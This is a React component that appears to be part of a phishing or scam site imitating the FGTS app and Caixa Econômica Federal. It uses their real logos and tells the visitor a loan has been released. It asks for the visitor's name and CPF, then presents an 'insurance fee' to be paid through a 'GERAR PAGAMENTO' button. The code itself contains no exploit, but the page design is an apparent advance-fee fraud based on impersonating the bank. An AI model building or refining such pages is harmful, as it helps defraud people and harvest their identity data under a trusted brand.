
import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';
import { Card, CardContent } from '@/components/ui/card';

const FinalPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [name, setName] = useState('');
  const [cpf, setCpf] = useState('');
  
  // Add scroll to top effect
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  
  // Get the data from location state
  const { 
    bankLogo, 
    bankName,
    totalAmount,
    installmentsCount,
    installmentValue,
    interestRate,
    userName,
    userCPF,
    pixKey,
    insuranceAmount
  } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal",
    totalAmount: 10000,
    installmentsCount: 60,
    installmentValue: 250,
    interestRate: 0.018,
    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
    userCPF: "123.456.789-00",
    insuranceAmount: 48.52
  };

  // Format CPF with dots and dash if it's not already formatted
  const formatCPF = (cpf: string) => {
    if (!cpf) return '';
    if (cpf.includes('.') || cpf.includes('-')) return cpf;
    
    const cpfDigits = cpf.replace(/\D/g, '');
    if (cpfDigits.length !== 11) return cpf;
    
    return `${cpfDigits.slice(0, 3)}.${cpfDigits.slice(3, 6)}.${cpfDigits.slice(6, 9)}-${cpfDigits.slice(9)}`;
  };

  const formatCurrency = (value: number): string => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(value);
  };

  const handleGeneratePayment = () => {
    // Navigate to the dashboard or next page
    navigate('/dashboard');
  };

  return (
    <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <div className="h-10"></div> {/* Placeholder for symmetry */}
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Empréstimo Liberado</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Finalize o processo para receber o valor
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 bg-white rounded-t-3xl overflow-hidden flex flex-col">
        <div className="flex-1 p-4 sm:p-6 pb-32">
          <div className="flex flex-col max-w-md mx-auto w-full">
            {/* Personal Information */}
            <div className="mb-6">
              <div className="mb-4">
                <Label htmlFor="fullName">Nome Completo:</Label>
                <Input 
                  id="fullName" 
                  value={name || userName}
                  onChange={(e) => setName(e.target.value)}
                  className="mt-1"
                />
              </div>
              
              <div className="mb-4">
                <Label htmlFor="cpf">CPF:</Label>
                <Input 
                  id="cpf" 
                  value={cpf || formatCPF(userCPF)}
                  onChange={(e) => setCpf(e.target.value)}
                  className="mt-1"
                />
              </div>
            </div>
            
            {/* Loan Summary */}
            <Card className="mb-6 border-green-100 bg-green-50">
              <CardContent className="p-4">
                <h3 className="font-bold text-xl text-green-800 mb-4">EMPRÉSTIMO LIBERADO</h3>
                
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-700">Valor:</span>
                    <span className="font-bold">{formatCurrency(totalAmount)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-700">Valor da Parcela:</span>
                    <span className="font-bold">{formatCurrency(installmentValue)}</span>
                  </div>
                </div>
              </CardContent>
            </Card>
            
            {/* Insurance Fee */}
            <Card className="mb-8 border-blue-100">
              <CardContent className="p-4">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="font-semibold text-lg">Taxa Seguradora:</h3>
                  <img 
                    src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
                    alt="Caixa Seguradora"
                    className="h-8 object-contain"
                  />
                </div>
                
                <div className="flex justify-between text-lg">
                  <span className="text-gray-700">Valor da Taxa:</span>
                  <span className="font-bold text-blue-700">{formatCurrency(insuranceAmount)}</span>
                </div>
              </CardContent>
            </Card>
            
            {/* Payment Button */}
            <Button 
              onClick={handleGeneratePayment} 
              className="w-full bg-[#005CA9] hover:bg-[#004A87] py-6 rounded-full mb-8"
            >
              GERAR PAGAMENTO
            </Button>
          </div>
        </div>
        
        {/* Footer */}
        <div className="mt-auto w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FinalPayment;
